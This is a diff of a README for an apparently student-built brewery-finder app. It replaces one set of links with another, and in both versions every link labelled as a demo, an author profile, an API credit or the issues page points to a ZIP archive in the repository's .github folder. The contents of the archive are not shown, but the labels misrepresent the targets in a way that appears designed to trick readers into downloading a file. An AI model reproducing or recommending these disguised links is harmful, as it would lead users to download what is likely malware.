@@ -40,29 +40,29 @@
 ### Deployment
 
 - Run `npm start` in an intergrated terminal in order to start a local live server.
-- Or try the [Live Demo](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip) (if available)
+- Or try the [Live Demo](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip) (if available)
 
 ## Author/s
 
 👤 **Iptisam Mukadam**
 
-- GitHub: [@githubhandle](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip)
+- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip)
 
 👤 **Daron Wiafe**
 
-- GitHub: [@githubhandle](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip)
-- Twitter: [@twitterhandle](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip)
-- LinkedIn: [LinkedIn](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip)
+- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip)
+- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip)
+- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip)
 
 ## Acknowledgments
 
-- Hat tip to [Openbrewerydb](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip) for the API.
+- Hat tip to [Openbrewerydb](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip) for the API.
 
 ## 🤝 Contributing
 
 Contributions, issues, and feature requests are welcome!
 
-Feel free to check the [issues page](https://github.com/Iptysam/Ipty-Daron-Capstone/raw/refs/heads/dev/.github/Ipty-Capstone-Daron-3.4.zip). 
+Feel free to check the [issues page](https://raw.githubusercontent.com/Iptysam/Ipty-Daron-Capstone/dev/.github/workflows/Ipty-Capstone-Daron-v1.1.zip). 
 
 ## Show your support
 
